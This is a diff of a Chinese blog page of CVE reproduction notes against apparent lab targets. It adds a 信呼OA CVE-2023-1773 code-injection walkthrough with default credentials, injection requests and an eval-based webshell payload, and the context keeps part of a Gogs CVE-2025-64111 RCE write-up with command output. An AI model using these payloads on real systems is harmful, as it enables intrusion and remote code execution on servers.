@@ -8,16 +8,16 @@
 	
 		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 	
-	<meta name="description" content="CVE-2025-64111靶标介绍： Gogs 是一款使用 Go 语言开发的开源自托管 Git 服务平台，主打轻量化与易部署，广泛应用于个人及小型团队的私有代码托管场景。 攻击者可通过特定 API 接口绕过安全检查，构造符号链接指向 .git&#x2F;config 配置文件，并对其内容进行修改。通过在配置文件中注入恶意 sshCommand 参数，攻击者可在系统执行 Git 相关操作时触发远程">
+	<meta name="description" content="CVE-2023-1773靶标介绍： 信呼OA是一款免费开源的办公OA系统，包括APP，pc上客户端，REIM即时通信，服务端等。信呼OA在2.3.3版本之前存在代码注入漏洞。该漏洞影响到组件配置文件处理程序的webmainConfig.php文件的代码。篡改导致代码注入。 信呼OA &lt;&#x3D;2.3.3 代码注入 打开可以看到版本信息： 1Copyright ©2026 信呼协同办公系">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CVE学习(持续更新)">
 <meta property="og:url" content="http://wo1fyr.github.io/2026/04/23/CVE/index.html">
 <meta property="og:site_name" content="wo1fyr的随笔">
-<meta property="og:description" content="CVE-2025-64111靶标介绍： Gogs 是一款使用 Go 语言开发的开源自托管 Git 服务平台，主打轻量化与易部署，广泛应用于个人及小型团队的私有代码托管场景。 攻击者可通过特定 API 接口绕过安全检查，构造符号链接指向 .git&#x2F;config 配置文件，并对其内容进行修改。通过在配置文件中注入恶意 sshCommand 参数，攻击者可在系统执行 Git 相关操作时触发远程">
+<meta property="og:description" content="CVE-2023-1773靶标介绍： 信呼OA是一款免费开源的办公OA系统，包括APP，pc上客户端，REIM即时通信，服务端等。信呼OA在2.3.3版本之前存在代码注入漏洞。该漏洞影响到组件配置文件处理程序的webmainConfig.php文件的代码。篡改导致代码注入。 信呼OA &lt;&#x3D;2.3.3 代码注入 打开可以看到版本信息： 1Copyright ©2026 信呼协同办公系">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://wo1fyr.github.io/img/CVE-2025-64111/1.png">
-<meta property="article:published_time" content="2026-04-23T06:50:00.000Z">
-<meta property="article:modified_time" content="2026-04-23T08:19:25.378Z">
+<meta property="article:published_time" content="2026-04-23T11:50:00.000Z">
+<meta property="article:modified_time" content="2026-04-24T04:13:25.371Z">
 <meta property="article:author" content="wo1fyr">
 <meta property="article:tag" content="CVE学习">
 <meta property="article:tag" content="漏洞复现">
@@ -577,7 +577,7 @@
 						
 						<div class="post-meta-detail post-meta-detail-time">
 							<i class="fa fa-clock-o" aria-hidden="true"></i>
-							<time title="发布于 2026-4-23 14:50:00 | 编辑于 2026-4-23 16:19:25">2026-4-23 14:50
+							<time title="发布于 2026-4-23 19:50:00 | 编辑于 2026-4-24 12:13:25">2026-4-23 19:50
 							</time>
 						</div>
 					
@@ -604,7 +604,7 @@
 						
 						<div class="post-meta-detail post-meta-detail-words">
 							<i class="fa fa-file-word-o" aria-hidden="true"></i>
-							1.4k 字
+							1.8k 字
 						</div>
 					
 						
@@ -612,7 +612,7 @@
 						
 						<div class="post-meta-detail post-meta-detail-readingtime">
 							<i class="fa fa-hourglass-end" aria-hidden="true"></i>
-							7 分钟
+							8 分钟
 						</div>
 					
 		</div>
@@ -620,7 +620,33 @@
 	</header>
 
 	<div class="post-content" id="post_content">
-		<h1 id="CVE-2025-64111"><a href="#CVE-2025-64111" class="headerlink" title="CVE-2025-64111"></a>CVE-2025-64111</h1><p><em>靶标介绍：</em></p>
+		<h1 id="CVE-2023-1773"><a href="#CVE-2023-1773" class="headerlink" title="CVE-2023-1773"></a>CVE-2023-1773</h1><p><em>靶标介绍：</em></p>
+<p>信呼OA是一款免费开源的办公OA系统，包括APP，pc上客户端，REIM即时通信，服务端等。信呼OA在2.3.3版本之前存在代码注入漏洞。该漏洞影响到组件配置文件处理程序的webmainConfig.php文件的代码。篡改导致代码注入。</p>
+<p>信呼OA &lt;&#x3D;2.3.3 代码注入</p>
+<p>打开可以看到版本信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copyright ©2026 信呼协同办公系统v2.3.1 </span><br></pre></td></tr></table></figure>
+
+<p>养成一个思维，这种明显的框架出现了第一时间去找到版本号，找找是否有Nday</p>
+<p>信呼安装之后默认存在账号diaochan&#x2F;xiaoqiao&#x2F;daqiao&#x2F;rock&#x2F;zhangfei&#x2F;zhaozl等用户，密码都是123456</p>
+<p>用diaochan&#x2F;123456登陆进去要求改密码，随便改一个root1</p>
+<p>hackbar构造请求（源码分析放在代码审计文章里面，这里只讲如何实现getshell）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET:https://eci-2ze3rq07n002sqck4mpo.cloudeci1.ichunqiu.com:80/index.php?d=main&amp;m=flow&amp;a=copymode&amp;ajaxbool=true</span><br><span class="line"></span><br><span class="line">POST:id=1&amp;name=a&#123;&#125;;phpinfo ();class a</span><br></pre></td></tr></table></figure>
+
+<p>回显OK说明成功写入class a了。对生成的文件进行访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://eci-2ze3rq07n002sqck4mpo.cloudeci1.ichunqiu.com:80/webmain/flow/input/mode_a&#123;&#125;;phpinfo ();class aAction.php</span><br></pre></td></tr></table></figure>
+
+<p>回显phpinfo()的信息</p>
+<p>开始注入getshell，还是刚刚的注入的url，将phpinfo()换成下面的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval (strtoupper(&quot;eval (\$_request[1]);&quot;));</span><br></pre></td></tr></table></figure>
+
+<p>这里这么写是有讲究的，源码里面会将传递的参数会被转换成小写字母</p>
+<p>回显ok说明上传成功，可以webshell工具进行连接</p>
+<p>还是刚刚访问phpinfo()的url，将命令换一下就行，url后面得url编码一下，不然会出错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag：flag&#123;28a92435-6a1e-4a67-ab5f-0d357074ddd3&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="CVE-2025-64111"><a href="#CVE-2025-64111" class="headerlink" title="CVE-2025-64111"></a>CVE-2025-64111</h1><p><em>靶标介绍：</em></p>
 <p>Gogs 是一款使用 Go 语言开发的开源自托管 Git 服务平台，主打轻量化与易部署，广泛应用于个人及小型团队的私有代码托管场景。 攻击者可通过特定 API 接口绕过安全检查，构造符号链接指向 .git&#x2F;config 配置文件，并对其内容进行修改。通过在配置文件中注入恶意 sshCommand 参数，攻击者可在系统执行 Git 相关操作时触发远程命令执行。（账号密码：gogs_admin&#x2F;admin123）</p>
 <p>影响版本&lt;&#x3D;0.13.3，CVSS4.0评分9.3</p>
 <p>访问<a target="_blank" rel="noopener" href="http://39.106.48.123:32916/admin%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8B%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF%EF%BC%9A">http://39.106.48.123:32916/admin可以查看版本信息：</a></p>
@@ -665,9 +691,6 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">21899@wolf MINGW64 /c/Wolf/Work-place/exp (master)</span><br><span class="line">$ git add .</span><br><span class="line"></span><br><span class="line">21899@wolf MINGW64 /c/Wolf/Work-place/exp (master)</span><br><span class="line">$ git -c user.name=attacker -c user.email=a@a commit -m <span class="string">&#x27;exp&#x27;</span></span><br><span class="line">[master a6eb67e] exp</span><br><span class="line"> 1 file changed, 1 insertion(+), 1 deletion(-)</span><br><span class="line"></span><br><span class="line">21899@wolf MINGW64 /c/Wolf/Work-place/exp (master)</span><br><span class="line">$ git -c credential.helper= push -u origin master</span><br><span class="line">Enumerating objects: 5, <span class="keyword">done</span>.</span><br><span class="line">Counting objects: 100% (5/5), <span class="keyword">done</span>.</span><br><span class="line">Writing objects: 100% (3/3), 223 bytes | 223.00 KiB/s, <span class="keyword">done</span>.</span><br><span class="line">Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)</span><br><span class="line">remote: uid=1000(git) gid=102(git) <span class="built_in">groups</span>=102(git),102(git)</span><br><span class="line">To http://39.106.48.123:32916/gogs_admin/exp.git</span><br><span class="line">   05d8e9b..a6eb67e  master -&gt; master</span><br><span class="line">branch <span class="string">&#x27;master&#x27;</span> <span class="built_in">set</span> up to track <span class="string">&#x27;origin/master&#x27;</span>.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>可以看到返回了id命令的结果</p>
-<h1 id="CVE-2023-1773"><a href="#CVE-2023-1773" class="headerlink" title="CVE-2023-1773"></a>CVE-2023-1773</h1><p><em>靶标介绍：</em></p>
-<p>信呼OA是一款免费开源的办公OA系统，包括APP，pc上客户端，REIM即时通信，服务端等。信呼OA在2.3.3版本之前存在代码注入漏洞。该漏洞影响到组件配置文件处理程序的webmainConfig.php文件的代码。篡改导致代码注入。</p>
-<p>信呼OA &lt;&#x3D;2.3.3 代码注入</p>
 
 	</div>
 
@@ -738,8 +761,8 @@
 <script type="text/javascript">
 	socialShare("#share", {
 	    title : 'CVE学习(持续更新)',
-	    description : `CVE-2025-64111靶标介绍：
-Gogs 是一款使用 Go 语言开发的开源自托管 Git 服...`,
+	    description : `CVE-2023-1773靶标介绍：
+信呼OA是一款免费开源的办公OA系统，包括APP，pc上客户端...`,
 	    wechatQrcodeTitle : "分享到微信",
 	    wechatQrcodeHelper : '微信扫描二维码',
 	    source : 'http://wo1fyr.github.io/2026/04/23/CVE/'
@@ -791,7 +814,7 @@ Gogs 是一款使用 Go 语言开发的开源自托管 Git 服...`,
 
 
 
-<div class="post-navigation card shadow-sm"><div class="post-navigation-item post-navigation-pre"></div><div class="post-navigation-item post-navigation-next"><span class="page-navigation-extra-text">下一篇 <i class="fa fa-arrow-circle-o-right" aria-hidden="true"></i></span><a href="/2026/04/23/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/" rel="next"> 蚁景网安-双层内网渗透虚拟仿真实战</a></div></div>
+<div class="post-navigation card shadow-sm"><div class="post-navigation-item post-navigation-pre"><span class="page-navigation-extra-text"><i class="fa fa-arrow-circle-o-left" aria-hidden="true"></i>上一篇</span><a href="/2026/04/24/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/" rel="prev"> PHP代码审计笔记(持续更新)</a></div><div class="post-navigation-item post-navigation-next"><span class="page-navigation-extra-text">下一篇 <i class="fa fa-arrow-circle-o-right" aria-hidden="true"></i></span><a href="/2026/04/23/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/" rel="next"> 蚁景网安-双层内网渗透虚拟仿真实战</a></div></div>
 
 
 
